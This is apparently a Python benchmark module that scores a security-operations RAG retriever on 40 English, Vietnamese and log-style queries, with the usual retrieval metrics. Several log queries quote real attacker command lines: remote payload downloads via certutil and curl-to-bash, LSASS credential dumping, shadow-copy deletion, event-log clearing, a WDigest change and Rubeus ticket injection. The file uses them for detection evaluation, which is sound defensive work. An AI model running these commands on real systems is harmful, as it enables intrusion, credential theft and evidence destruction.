# -*- coding: utf-8 -*-
"""
src/eval/rag_benchmark.py
Curated deterministic 40-query RAG retrieval ablation benchmark covering:
  - English (EN) SOC/MITRE/Wazuh queries (15 queries)
  - Vietnamese (VI) SOC analyst queries (13 queries)
  - OOD Behavioral Log Queries (12 queries across Windows/Linux/Cloud logs)

Evaluates 3 isolated retrieval modes via `RAGKnowledgeBaseTool` without mutating
saved index data:
  1. `legacy_tfidf`: Original raw TF-IDF Cosine without bilingual expansion
  2. `bm25`: Cached Okapi BM25 + Bilingual VI<->EN expansion
  3. `hybrid_rrf`: Lexical BM25 + Dense Embedding Reciprocal Rank Fusion (RRF, k=60)
"""

from __future__ import annotations

import math
import time
from typing import Any, Dict, List, Literal, Optional, Sequence

from pydantic import BaseModel, Field

from src.tools.rag_embeddings import LocalCharNgramDenseProvider
from src.tools.rag_knowledge_base import RAGKnowledgeBaseTool

RAGMode = Literal["legacy_tfidf", "bm25", "hybrid_rrf"]


class RAGQueryCase(BaseModel):
    """Single curated retrieval evaluation query with ground-truth doc IDs."""

    query_id: str
    language: Literal["en", "vi", "ood_log"]
    collection: Literal["mitre_attack", "wazuh_rules", "knowledge_docs"]
    query: str
    relevant_doc_ids: List[str] = Field(default_factory=list)


class RAGVariantMetrics(BaseModel):
    """Aggregated IR metrics for a single retrieval mode."""

    mode: str
    total_queries: int = 0
    hit_at_1: float = 0.0
    hit_at_3: float = 0.0
    mrr_at_5: float = 0.0
    ndcg_at_5: float = 0.0
    mean_latency_ms: float = 0.0
    by_language: Dict[str, Dict[str, float]] = Field(default_factory=dict)


class RAGAblationReport(BaseModel):
    """Complete RAG ablation benchmark results across all 3 retrieval modes."""

    total_queries: int = 0
    backend: str = ""
    embedding_provider: str = ""
    embedding_model: str = ""
    variants: Dict[str, RAGVariantMetrics] = Field(default_factory=dict)
    per_query_details: List[Dict[str, Any]] = Field(default_factory=list)


def get_curated_rag_queries() -> List[RAGQueryCase]:
    """Return the deterministic 40-query EN / VI / OOD-Behavioral RAG benchmark."""
    return [
        # === 1. ENGLISH SOC QUERIES (15) ===
        RAGQueryCase(
            query_id="RAG-EN-01",
            language="en",
            collection="mitre_attack",
            query="encoded powershell script block execution hidden window bypass policy",
            relevant_doc_ids=["T1059.001", "T1027"],
        ),
        RAGQueryCase(
            query_id="RAG-EN-02",
            language="en",
            collection="mitre_attack",
            query="dumping credentials from LSASS process memory using minidump",
            relevant_doc_ids=["T1003.001"],
        ),
        RAGQueryCase(
            query_id="RAG-EN-03",
            language="en",
            collection="mitre_attack",
            query="ransomware deleting volume shadow copies to inhibit system recovery",
            relevant_doc_ids=["T1490", "T1486"],
        ),
        RAGQueryCase(
            query_id="RAG-EN-04",
            language="en",
            collection="mitre_attack",
            query="creating scheduled task persistence via schtasks on logon",
            relevant_doc_ids=["T1053.005"],
        ),
        RAGQueryCase(
            query_id="RAG-EN-05",
            language="en",
            collection="mitre_attack",
            query="downloading remote payload tool transfer over http from attacker server",
            relevant_doc_ids=["T1105", "T1071.001"],
        ),
        RAGQueryCase(
            query_id="RAG-EN-06",
            language="en",
            collection="mitre_attack",
            query="lateral movement using SMB administrative shares C$ and ADMIN$",
            relevant_doc_ids=["T1021.002"],
        ),
        RAGQueryCase(
            query_id="RAG-EN-07",
            language="en",
            collection="mitre_attack",
            query="clearing Windows Security event logs to remove forensic evidence",
            relevant_doc_ids=["T1070.001"],
        ),
        RAGQueryCase(
            query_id="RAG-EN-08",
            language="en",
            collection="mitre_attack",
            query="exfiltration of sensitive archive data over command and control channel",
            relevant_doc_ids=["T1041"],
        ),
        RAGQueryCase(
            query_id="RAG-EN-09",
            language="en",
            collection="mitre_attack",
            query="exploiting public facing web application SQL injection vulnerability",
            relevant_doc_ids=["T1190"],
        ),
        RAGQueryCase(
            query_id="RAG-EN-10",
            language="en",
            collection="mitre_attack",
            query="privilege escalation via sudo caching or misconfigured sudoers",
            relevant_doc_ids=["T1548.003"],
        ),
        RAGQueryCase(
            query_id="RAG-EN-11",
            language="en",
            collection="wazuh_rules",
            query="SQL injection attempt detected in web application HTTP query string",
            relevant_doc_ids=["92211", "31103"],
        ),
        RAGQueryCase(
            query_id="RAG-EN-12",
            language="en",
            collection="wazuh_rules",
            query="multiple failed SSH login brute force attempts from remote host",
            relevant_doc_ids=["5712", "5710"],
        ),
        RAGQueryCase(
            query_id="RAG-EN-13",
            language="en",
            collection="wazuh_rules",
            query="ransomware vssadmin delete shadows wbadmin catalog",
            relevant_doc_ids=["100501"],
        ),
        RAGQueryCase(
            query_id="RAG-EN-14",
            language="en",
            collection="knowledge_docs",
            query="Active Directory DACL modification granting DCSync replication rights",
            relevant_doc_ids=["SDWIN-190301125905", "SDWIN-190301174830"],
        ),
        RAGQueryCase(
            query_id="RAG-EN-15",
            language="en",
            collection="knowledge_docs",
            query="AWS cloud breach EC2 metadata SSRF and S3 bucket exfiltration",
            relevant_doc_ids=["SDAWS-200914011940"],
        ),

        # === 2. VIETNAMESE SOC QUERIES (13) ===
        RAGQueryCase(
            query_id="RAG-VI-01",
            language="vi",
            collection="mitre_attack",
            query="trích xuất bộ nhớ tiến trình để đánh cắp mật khẩu hệ thống",
            relevant_doc_ids=["T1003.001"],
        ),
        RAGQueryCase(
            query_id="RAG-VI-02",
            language="vi",
            collection="mitre_attack",
            query="mã độc tống tiền mã hóa tập tin và xóa bản sao lưu hệ thống",
            relevant_doc_ids=["T1486", "T1490"],
        ),
        RAGQueryCase(
            query_id="RAG-VI-03",
            language="vi",
            collection="mitre_attack",
            query="leo thang đặc quyền chiếm quyền quản trị cao nhất trên máy chủ",
            relevant_doc_ids=["T1548.003"],
        ),
        RAGQueryCase(
            query_id="RAG-VI-04",
            language="vi",
            collection="mitre_attack",
            query="dò quét cổng dịch vụ mở và dò quét máy chủ trong mạng nội bộ",
            relevant_doc_ids=["T1046", "T1018"],
        ),
        RAGQueryCase(
            query_id="RAG-VI-05",
            language="vi",
            collection="mitre_attack",
            query="tấn công vét cạn dò đoán mật khẩu đăng nhập nhiều lần",
            relevant_doc_ids=["T1110"],
        ),
        RAGQueryCase(
            query_id="RAG-VI-06",
            language="vi",
            collection="mitre_attack",
            query="di chuyển ngang qua chia sẻ tệp tin quản trị trên mạng nội bộ",
            relevant_doc_ids=["T1021.002"],
        ),
        RAGQueryCase(
            query_id="RAG-VI-07",
            language="vi",
            collection="mitre_attack",
            query="tải công cụ tấn công từ máy chủ bên ngoài về máy nạn nhân",
            relevant_doc_ids=["T1105"],
        ),
        RAGQueryCase(
            query_id="RAG-VI-08",
            language="vi",
            collection="mitre_attack",
            query="xóa nhật ký sự kiện bảo mật để che giấu dấu vết xâm nhập",
            relevant_doc_ids=["T1070.001"],
        ),
        RAGQueryCase(
            query_id="RAG-VI-09",
            language="vi",
            collection="mitre_attack",
            query="rò rỉ dữ liệu nhạy cảm ra ngoài qua kênh điều khiển từ xa",
            relevant_doc_ids=["T1041"],
        ),
        RAGQueryCase(
            query_id="RAG-VI-10",
            language="vi",
            collection="mitre_attack",
            query="gửi liên kết lừa đảo giả mạo để đánh cắp thông tin đăng nhập",
            relevant_doc_ids=["T1566.002"],
        ),
        RAGQueryCase(
            query_id="RAG-VI-11",
            language="vi",
            collection="wazuh_rules",
            query="cảnh báo tiêm mã sql tấn công khai thác lỗ hổng ứng dụng web",
            relevant_doc_ids=["92211", "31103"],
        ),
        RAGQueryCase(
            query_id="RAG-VI-12",
            language="vi",
            collection="wazuh_rules",
            query="cảnh báo mã độc tống tiền xóa bản sao lưu chống khôi phục",
            relevant_doc_ids=["100501"],
        ),
        RAGQueryCase(
            query_id="RAG-VI-13",
            language="vi",
            collection="knowledge_docs",
            query="khám phá thiết bị mạng nội bộ thông qua đọc bảng arp cache",
            relevant_doc_ids=["SDLIN-201110074812"],
        ),

        # === 3. OOD BEHAVIORAL LOG QUERIES (12) ===
        RAGQueryCase(
            query_id="RAG-OOD-01",
            language="ood_log",
            collection="mitre_attack",
            query="pwsh.exe -NoP -W Hidden -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA",
            relevant_doc_ids=["T1059.001", "T1027"],
        ),
        RAGQueryCase(
            query_id="RAG-OOD-02",
            language="ood_log",
            collection="mitre_attack",
            query="rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 624 lsass.dmp full",
            relevant_doc_ids=["T1003.001"],
        ),
        RAGQueryCase(
            query_id="RAG-OOD-03",
            language="ood_log",
            collection="mitre_attack",
            query="vssadmin.exe delete shadows /all /quiet && wbadmin delete catalog -quiet",
            relevant_doc_ids=["T1490"],
        ),
        RAGQueryCase(
            query_id="RAG-OOD-04",
            language="ood_log",
            collection="mitre_attack",
            query="certutil.exe -urlcache -split -f http://91.214.124.77/beacon.exe C:\\Users\\Public\\b.exe",
            relevant_doc_ids=["T1105"],
        ),
        RAGQueryCase(
            query_id="RAG-OOD-05",
            language="ood_log",
            collection="mitre_attack",
            query="wevtutil.exe cl Security && wevtutil.exe cl System",
            relevant_doc_ids=["T1070.001"],
        ),
        RAGQueryCase(
            query_id="RAG-OOD-06",
            language="ood_log",
            collection="mitre_attack",
            query="sudo -u root /bin/bash -c id && pam_unix(sudo:session): session opened for user root",
            relevant_doc_ids=["T1548.003"],
        ),
        RAGQueryCase(
            query_id="RAG-OOD-07",
            language="ood_log",
            collection="mitre_attack",
            query="curl -fsSL http://91.195.240.94/init_stage.sh | /bin/bash -s",
            relevant_doc_ids=["T1059.004", "T1105"],
        ),
        RAGQueryCase(
            query_id="RAG-OOD-08",
            language="ood_log",
            collection="wazuh_rules",
            query="Failed password for invalid user admin from 185.220.101.5 port 51234 ssh2",
            relevant_doc_ids=["5710", "5712"],
        ),
        RAGQueryCase(
            query_id="RAG-OOD-09",
            language="ood_log",
            collection="knowledge_docs",
            query="Invoke-WMIExec Set-WmiInstance __EventFilter CommandLineEventConsumer persistence",
            relevant_doc_ids=["SDWIN-190518184306"],
        ),
        RAGQueryCase(
            query_id="RAG-OOD-10",
            language="ood_log",
            collection="knowledge_docs",
            query="Rubeus.exe asktgt /user:admin /rc4:a87f3a337d73085c45f9416be5787d86 /ptt",
            relevant_doc_ids=["SDWIN-190319145126"],
        ),
        RAGQueryCase(
            query_id="RAG-OOD-11",
            language="ood_log",
            collection="knowledge_docs",
            query="reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest /v UseLogonCredential /d 1",
            relevant_doc_ids=["SDWIN-190518201922"],
        ),
        RAGQueryCase(
            query_id="RAG-OOD-12",
            language="ood_log",
            collection="knowledge_docs",
            query="arp -a && ip neigh show discovery network neighbors linux",
            relevant_doc_ids=["SDLIN-201110074812"],
        ),
    ]


def _extract_doc_id(collection: str, record: Dict[str, Any]) -> str:
    if collection == "mitre_attack":
        return str(record.get("technique_id") or record.get("id") or "").strip().upper()
    if collection == "wazuh_rules":
        return str(record.get("rule_id") or record.get("id") or "").strip()
    return str(record.get("doc_id") or record.get("id") or "").strip()


def _normalize_relevant(collection: str, ids: Sequence[str]) -> List[str]:
    if collection == "mitre_attack":
        return [str(x).strip().upper() for x in ids if str(x).strip()]
    return [str(x).strip() for x in ids if str(x).strip()]


def _score_single_query(
    retrieved_ids: Sequence[str],
    relevant_ids: Sequence[str],
) -> Dict[str, float]:
    rel_set = set(relevant_ids)
    top1 = 1.0 if (retrieved_ids and retrieved_ids[0] in rel_set) else 0.0
    top3 = 1.0 if any(d in rel_set for d in retrieved_ids[:3]) else 0.0

    mrr5 = 0.0
    for rank, doc_id in enumerate(retrieved_ids[:5], start=1):
        if doc_id in rel_set:
            mrr5 = 1.0 / rank
            break

    dcg5 = 0.0
    seen_rel: set[str] = set()
    for idx, doc_id in enumerate(retrieved_ids[:5]):
        if doc_id in rel_set and doc_id not in seen_rel:
            seen_rel.add(doc_id)
            dcg5 += 1.0 / math.log2(idx + 2)

    ideal_count = min(5, len(rel_set))
    idcg5 = sum(1.0 / math.log2(idx + 2) for idx in range(ideal_count))
    ndcg5 = (dcg5 / idcg5) if idcg5 > 0.0 else 0.0

    return {
        "hit_at_1": top1,
        "hit_at_3": top3,
        "mrr_at_5": mrr5,
        "ndcg_at_5": ndcg5,
    }


def _aggregate_query_scores(
    rows: Sequence[Dict[str, Any]],
) -> Dict[str, float]:
    n = len(rows)
    if n == 0:
        return {
            "total_queries": 0.0,
            "hit_at_1": 0.0,
            "hit_at_3": 0.0,
            "mrr_at_5": 0.0,
            "ndcg_at_5": 0.0,
            "mean_latency_ms": 0.0,
        }
    return {
        "total_queries": float(n),
        "hit_at_1": round(sum(r["hit_at_1"] for r in rows) / n, 4),
        "hit_at_3": round(sum(r["hit_at_3"] for r in rows) / n, 4),
        "mrr_at_5": round(sum(r["mrr_at_5"] for r in rows) / n, 4),
        "ndcg_at_5": round(sum(r["ndcg_at_5"] for r in rows) / n, 4),
        "mean_latency_ms": round(sum(r["latency_ms"] for r in rows) / n, 3),
    }


def run_rag_ablation(
    rag_kb: Optional[RAGKnowledgeBaseTool] = None,
    queries: Optional[Sequence[RAGQueryCase]] = None,
    modes: Sequence[str] = ("legacy_tfidf", "bm25", "hybrid_rrf"),
    offline_only: bool = True,
) -> RAGAblationReport:
    """
    Benchmark `legacy_tfidf`, `bm25`, and `hybrid_rrf` retrieval modes on the curated
    ~40-query EN/VI/OOD benchmark without mutating persisted RAG data.
    """
    if rag_kb is None:
        emb = LocalCharNgramDenseProvider() if offline_only else None
        kb = RAGKnowledgeBaseTool(auto_sync_docs=False, embedding_provider=emb)
    else:
        kb = rag_kb

    # Isolate fallback_only view for lexical modes when needed while keeping saved files untouched
    query_list = list(queries) if queries is not None else get_curated_rag_queries()
    backend_info = kb.get_backend_info()

    variants: Dict[str, RAGVariantMetrics] = {}
    per_query_details: List[Dict[str, Any]] = []

    for mode in modes:
        mode_rows: List[Dict[str, Any]] = []
        for q in query_list:
            t0 = time.perf_counter()
            if mode in ("legacy_tfidf", "bm25"):
                hits = kb.query_lexical_only(
                    q.collection,
                    q.query,
                    n_results=5,
                    mode=mode,
                )
            else:
                hits = kb.query_collection(
                    q.collection,
                    q.query,
                    n_results=5,
                    search_mode=mode,
                )
            elapsed_ms = (time.perf_counter() - t0) * 1000.0

            retrieved_ids = [_extract_doc_id(q.collection, h) for h in hits]
            rel_ids = _normalize_relevant(q.collection, q.relevant_doc_ids)
            ir = _score_single_query(retrieved_ids, rel_ids)

            row = {
                "mode": mode,
                "query_id": q.query_id,
                "language": q.language,
                "collection": q.collection,
                "retrieved_ids": retrieved_ids,
                "relevant_ids": rel_ids,
                "latency_ms": round(elapsed_ms, 3),
                **ir,
            }
            mode_rows.append(row)
            per_query_details.append(row)

        overall = _aggregate_query_scores(mode_rows)
        by_lang: Dict[str, Dict[str, float]] = {}
        for lang in ("en", "vi", "ood_log"):
            lang_rows = [r for r in mode_rows if r["language"] == lang]
            if lang_rows:
                by_lang[lang] = _aggregate_query_scores(lang_rows)

        variants[mode] = RAGVariantMetrics(
            mode=mode,
            total_queries=len(mode_rows),
            hit_at_1=overall["hit_at_1"],
            hit_at_3=overall["hit_at_3"],
            mrr_at_5=overall["mrr_at_5"],
            ndcg_at_5=overall["ndcg_at_5"],
            mean_latency_ms=overall["mean_latency_ms"],
            by_language=by_lang,
        )

    return RAGAblationReport(
        total_queries=len(query_list),
        backend=str(backend_info.get("backend", "unknown")),
        embedding_provider=str(backend_info.get("embedding_provider", "unknown")),
        embedding_model=str(backend_info.get("embedding_model", "unknown")),
        variants=variants,
        per_query_details=per_query_details,
    )
